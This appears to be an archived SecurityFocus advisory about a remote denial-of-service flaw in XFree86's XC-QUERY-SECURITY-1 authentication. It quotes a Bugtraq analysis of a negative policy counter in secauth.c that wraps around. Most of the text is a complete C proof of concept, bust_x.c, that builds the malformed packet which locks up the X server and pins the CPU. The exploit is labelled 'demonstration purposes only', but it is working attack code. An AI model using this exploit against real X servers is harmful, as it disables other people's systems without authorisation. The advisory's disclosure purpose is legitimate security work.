source: http://www.securityfocus.com/bid/1235/info

A denial of service exists in XFree86 3.3.5, 3.3.6 and 4.0. A remote user can send a malformed packet to the TCP listening port, 6000, which will cause the X server to be unresponsive for some period of time. During this time, the keyboard will not respond to user input, and in some cases, the mouse will also not respond. During this time period, the X server will utilize 100% of the CPU, and can only be repaired by being signaled. This vulnerability exists only in servers compiled with the XCSECURITY #define set. This can be verified by running the following:
strings /path/to/XF86_SVGA | grep "XC-QUERY-SECURITY-1"

To quote the Bugtraq post, by Chris Evans <chris@ferret.lmh.ox.ac.uk>:
"Observe xc/programs/Xserver/os/secauth.c, AuthCheckSitePolicy():

// dataP is user supplied data from the network
char *policy = *dataP;
int nPolicies;
...
// Oh dear, we can set nPolicies to -1
nPolicies = *policy++;
while (nPolicies) {
// Do some stuff in a loop
...
nPolicies--;
}

So, the counter "nPolicies", if seeded with -1, will decrement towards
about minus 2 billion, then wrap to become positive 2 billion, and head
towards its final destination of 0." 

/* bust_x.c
 * Demonstration purposes only!
 * Chris Evans <chris@scary.beasts.org>
 */
int
main(int argc, const char* argv[])
{
  char bigbuf[201];
  short s;
  char c;

  c = -120;

  memset(bigbuf, c, sizeof(bigbuf));

  /* Little endian */
  c = 'l';
  write(1, &c, 1);
  /* PAD */
  c = 0;
  write(1, &c, 1);
  /* Major */
  s = 11;
  write(1, &s, 2);
  /* Minor */
  s = 0;
  write(1, &s, 2);
  /* Auth proto len */
  s = 19;
  write(1, &s, 2);
  /* Auth string len */
  s = 200;
  write(1, &s, 2);

  /* PAD */
  s = 0;
  write(1, &s, 2);

  /* Auth name */
  write(1, "XC-QUERY-SECURITY-1", 19);

  /* byte to round to multiple of 4 */
  c = 0;
  write(1, &c, 1);

  /* Auth data */
  /* Site policy please */
  c = 2;
  write(1, &c, 1);
  /* "permit" - doesn't really matter */
  c = 0;
  write(1, &c, 1);
  /* number of policies: -1, loop you sucker:) */
  c = -1;
  write(1, &c, 1);
  /* Negative stringlen.. 201 of them just in case, chortle... */

  write(1, bigbuf, sizeof(bigbuf));
}